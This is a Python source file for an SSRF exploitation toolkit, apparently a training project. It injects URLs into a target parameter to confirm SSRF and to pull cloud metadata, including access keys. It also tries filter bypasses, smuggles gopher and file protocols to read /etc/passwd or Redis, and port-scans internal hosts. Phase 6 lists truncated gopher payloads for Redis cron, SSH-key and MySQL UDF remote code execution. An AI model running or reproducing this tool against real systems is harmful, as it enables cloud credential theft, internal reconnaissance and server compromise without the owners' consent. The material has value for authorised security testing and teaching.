#!/usr/bin/env python3
"""
ssrf_toolkit.py — Advanced SSRF Exploitation Toolkit
Project #42: Server-Side Request Forgery (Advanced)
(Linux/WSL edition — Phase 7 bug fixed)
"""

import json
import sys
import time
import argparse
import os
from datetime import datetime
import requests

DEFAULT_TIMEOUT = 5
REPORTS_DIR = "reports"

class Colors:
    GREEN   = "\033[92m"
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    RESET   = "\033[0m"
    BOLD    = "\033[1m"

class SSRFToolkit:
    def __init__(self, target_url, param="url", payloads_file="payloads.json"):
        self.target_url = target_url
        self.param = param
        self.report = {
            "target": target_url,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {}
        }
        with open(payloads_file) as f:
            self.payloads = json.load(f)

    def _inject(self, payload_url, headers=None):
        params = {self.param: payload_url}
        start = time.time()
        try:
            r = requests.get(
                self.target_url,
                params=params,
                headers=headers or {},
                timeout=DEFAULT_TIMEOUT,
                allow_redirects=True,
            )
            return r.status_code, r.text, time.time() - start
        except requests.exceptions.Timeout:
            return None, "[TIMEOUT]", time.time() - start
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}", time.time() - start

    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] SSRF DETECTION{Colors.RESET}")
        results = {}

        print(f"\n  [RESPONSE_BASED] Testing internal content return")
        internal = self.payloads["detection"]["oob_callback_base"]
        status, body, elapsed = self._inject(internal)
        marker = self.payloads["detection"]["response_marker"]
        if marker in (body or ""):
            print(f"    {Colors.GREEN}[+] SSRF CONFIRMED!{Colors.RESET} marker '{marker}' found")
            results["response_based"] = {"confirmed": True, "evidence": body[:200]}
        else:
            print(f"    {Colors.YELLOW}[-] No marker found{Colors.RESET}")
            results["response_based"] = {"confirmed": False}

        print(f"\n  [TIME_BASED] Testing time-based delay")
        slow = self.payloads["detection"]["time_based_sleep"]
        status, body, elapsed = self._inject(slow)
        if elapsed >= 3.0:
            print(f"    {Colors.GREEN}[+] SSRF CONFIRMED!{Colors.RESET} {elapsed:.1f}s delay")
            results["time_based"] = {"confirmed": True, "delay": elapsed}
        else:
            print(f"    {Colors.YELLOW}[-] No delay{Colors.RESET} ({elapsed:.1f}s)")
            results["time_based"] = {"confirmed": False, "delay": elapsed}

        print(f"\n  [ERROR_BASED] Testing error message leakage")
        status, body, elapsed = self._inject("http://nonexistent-xyz-999.invalid/")
        if body and any(k in body.lower() for k in
                        ["traceback", "exception", "stack", "socket", "urlopen"]):
            print(f"    {Colors.GREEN}[+] Error details leaked{Colors.RESET}")
            results["error_based"] = {"confirmed": True, "evidence": body[:200]}
        else:
            print(f"    {Colors.YELLOW}[-] No error leak{Colors.RESET}")
            results["error_based"] = {"confirmed": False}

        self.report["phases"]["detection"] = results

    def phase2_cloud_metadata(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] CLOUD METADATA{Colors.RESET}")
        results = {}
        headers_map = self.payloads.get("cloud_headers", {})

        for name, url in self.payloads["cloud_metadata"].items():
            provider = name.split("_")[0]
            hdrs = headers_map.get(provider, {})
            status, body, elapsed = self._inject(url, headers=hdrs)
            hit = False
            if body and not body.startswith("[ERROR") and not body.startswith("[TIMEOUT"):
                for kw in ["ami-id", "instance-id", "computemetadata", "vmid",
                           "subscriptionid", "accesskeyid", "digitalocean",
                           "hostname", "region"]:
                    if kw in body.lower():
                        hit = True
                        break
                if "INTERNAL_SECRET_DATA" in body or "ADMIN PANEL" in body:
                    hit = True
            tag = (f"{Colors.GREEN}[+] {name.upper()} METADATA!{Colors.RESET}"
                   if hit else
                   f"{Colors.YELLOW}[-] {name}{Colors.RESET}")
            print(f"    [{name}] {tag}")
            results[name] = {"url": url, "hit": hit,
                             "response_snippet": (body or "")[:300]}
        self.report["phases"]["cloud_metadata"] = results

    def phase3_filter_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] FILTER BYPASS{Colors.RESET}")
        results = {}
        marker = self.payloads["detection"]["response_marker"]

        for technique, payload_list in self.payloads["bypass"].items():
            results[technique] = []
            for payload in payload_list:
                status, body, elapsed = self._inject(payload)
                hit = marker in (body or "") or "INTERNAL_SECRET_DATA" in (body or "")
                tag = (f"{Colors.GREEN}[+] BYPASSED!{Colors.RESET}"
                       if hit else
                       f"{Colors.YELLOW}[-] blocked{Colors.RESET}")
                print(f"    [{technique.upper()}] {payload[:60]}")
                print(f"      {tag}")
                results[technique].append({
                    "payload": payload, "bypassed": hit, "status": status,
                    "snippet": (body or "")[:150],
                })
        self.report["phases"]["filter_bypass"] = results

    def phase4_protocol_smuggling(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] PROTOCOL SMUGGLING{Colors.RESET}")
        results = {}
        for name, payload in self.payloads["protocol_smuggling"].items():
            status, body, elapsed = self._inject(payload)
            hit = False
            if body:
                if "unsupported" in body.lower() or "invalid url" in body.lower():
                    hit = False
                elif "root:x:" in body or "redis_version" in body.lower():
                    hit = True
                elif not body.startswith("[ERROR") and not body.startswith("[TIMEOUT"):
                    hit = True
            tag = (f"{Colors.GREEN}[+] WORKS{Colors.RESET}"
                   if hit else
                   f"{Colors.YELLOW}[-] rejected{Colors.RESET}")
            print(f"    [{name}] {tag}")
            results[name] = {"payload": payload, "worked": hit,
                             "snippet": (body or "")[:300]}
        self.report["phases"]["protocol_smuggling"] = results

    def phase5_internal_scan(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] INTERNAL PORT SCAN{Colors.RESET}")
        results = []
        for host in self.payloads["internal_scan"]["hosts"]:
            for port in self.payloads["internal_scan"]["ports"]:
                url = f"http://{host}:{port}/"
                status, body, elapsed = self._inject(url)
                open_hint = bool(body and not body.startswith("[ERROR")
                                 and not body.startswith("[TIMEOUT"))
                if elapsed > 0.5 and not (body or "").startswith("[ERROR"):
                    open_hint = True
                state = "OPEN" if open_hint else "closed/filtered"
                color = Colors.GREEN if open_hint else Colors.YELLOW
                print(f"    {color}[{host}:{port}] {state} ({elapsed:.2f}s){Colors.RESET}")
                results.append({"host": host, "port": port, "state": state,
                                "elapsed": round(elapsed, 3)})
        self.report["phases"]["internal_scan"] = results

    def phase6_rce_payloads(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] RCE PAYLOADS (informational){Colors.RESET}")
        payloads = {
            "redis_rce_cron": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...",
            "redis_rce_ssh_key": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...",
            "mysql_udf_rce": "gopher://127.0.0.1:3306/_<template>",
        }
        for k, v in payloads.items():
            print(f"    [{k}] {v[:80]}...")
        self.report["phases"]["rce_payloads"] = payloads

    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, dict):
                        if (value.get("confirmed") or value.get("hit")
                                or value.get("worked")):
                            confirmed.append(f"{phase}.{key}")
                    elif isinstance(value, list):
                        for item in value:
                            if isinstance(item, dict) and item.get("bypassed"):
                                pl = str(item.get("payload", ""))[:50]
                                confirmed.append(f"{phase}.{key}[{pl}]")
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get("state") == "OPEN":
                        confirmed.append(f"{phase}.{item.get('host')}:{item.get('port')}")
        return confirmed

    def phase7_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 7] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        os.makedirs(REPORTS_DIR, exist_ok=True)
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

        json_path = f"{REPORTS_DIR}/ssrf_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/ssrf_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html_report(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html_report(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:3000]}</pre>"
        return f"""<!DOCTYPE html>
<html><head><title>SSRF Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>SSRF Exploitation Report</h1>
<p><b>Target:</b> {self.target_url}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print("  Advanced SSRF Exploitation Toolkit - Project #42")
        print("=" * 64)
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Parameter: {self.param}")
        self.phase1_detection()
        self.phase2_cloud_metadata()
        self.phase3_filter_bypass()
        self.phase4_protocol_smuggling()
        self.phase5_internal_scan()
        self.phase6_rce_payloads()
        self.phase7_report()

def main():
    ap = argparse.ArgumentParser(description="Advanced SSRF Exploitation Toolkit")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("-p", "--param", default="url")
    ap.add_argument("--payloads", default="payloads.json")
    args = ap.parse_args()
    toolkit = SSRFToolkit(args.target, args.param, args.payloads)
    toolkit.run_all()

if __name__ == "__main__":
    main()
